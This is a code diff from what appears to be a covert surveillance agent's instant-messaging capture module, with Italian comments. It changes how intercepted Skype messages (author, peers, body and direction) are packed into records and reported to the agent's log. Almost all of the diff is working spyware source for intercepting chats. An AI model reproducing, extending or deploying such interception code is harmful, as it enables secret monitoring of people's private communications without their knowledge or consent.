@@ -177,6 +177,8 @@ char *GetChatName(char *msg)
 void SkypeLogMessageEntry(im_skype_message_entry *skentry)
 {
 	bin_buf tolog;
+	DWORD flags = 0;
+	DWORD program = 1; // ID di skype
 	struct tm tstamp;
 	WCHAR *topic, *peers, *body, *author;
 	DWORD delimiter = ELEM_DELIMITER;
@@ -191,16 +193,20 @@ void SkypeLogMessageEntry(im_skype_message_entry *skentry)
 	body = UTF8_2_UTF16(skentry->body);
 	author = UTF8_2_UTF16(skentry->author);
 
-	if (topic && peers && body && author) {
+	if (peers && body && author) {
+		if (skentry->direction == SKYPE_MSG_IN)
+			flags |= 0x01;
+
 		tolog.add(&tstamp, sizeof(tstamp));
-		tolog.add(L"SKYPE", (wcslen(L"SKYPE")+1)*sizeof(WCHAR));
-		tolog.add(topic, (wcslen(topic)+1)*sizeof(WCHAR));
+		tolog.add(&program, sizeof(DWORD));
+		tolog.add(&flags, sizeof(DWORD));
+		tolog.add(author, (wcslen(author)+1)*sizeof(WCHAR));
+		tolog.add(author, (wcslen(author)+1)*sizeof(WCHAR));
 		tolog.add(peers, (wcslen(peers)+1)*sizeof(WCHAR));
-		tolog.add(author, wcslen(author)*sizeof(WCHAR));
-		tolog.add(L": ", wcslen(L": ")*sizeof(WCHAR));
+		tolog.add(peers, (wcslen(peers)+1)*sizeof(WCHAR));		
 		tolog.add(body, (wcslen(body)+1)*sizeof(WCHAR));
 		tolog.add(&delimiter, sizeof(DWORD));
-		LOG_ReportLog(PM_IMAGENT_SKYPE, tolog.get_buf(), tolog.get_len());
+		LOG_ReportLog(PM_IMAGENT_SKYPENEW, tolog.get_buf(), tolog.get_len());
 	}
 	SAFE_FREE(topic);
 	SAFE_FREE(peers);
@@ -389,7 +395,7 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 
 	if (bStartFlag) {
 		LOG_InitAgentLog(PM_IMAGENT);
-		LOG_InitAgentLog(PM_IMAGENT_SKYPE);
+		LOG_InitAgentLog(PM_IMAGENT_SKYPENEW);
 
 		// Crea il thread che esegue gli IM
 		hIMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMCaptureThread, NULL, 0, &dummy);
@@ -410,7 +416,7 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 		
 		// chiude il logging (come ultima cosa)
 		LOG_StopAgentLog(PM_IMAGENT);
-		LOG_StopAgentLog(PM_IMAGENT_SKYPE);
+		LOG_StopAgentLog(PM_IMAGENT_SKYPENEW);
 	}
 
 	return 1;
